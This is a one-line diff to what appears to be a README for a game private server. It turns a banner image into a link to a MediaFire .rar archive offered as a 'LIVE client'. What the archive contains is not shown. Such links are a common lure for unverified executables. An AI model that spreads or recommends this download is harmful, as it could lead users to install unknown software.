@@ -1,4 +1,4 @@
-![SEASON UPGRADE 25, 26](docs/season-upgrade-25-26.svg)
+[![SEASON UPGRADE 25, 26](docs/season-upgrade-25-26.svg)](https://www.mediafire.com/file/bfkbuj3u4rwsetd/FO3ID-Season-25-26-LIVE-client.rar/file)
 
 # FO3ID Private Server
 
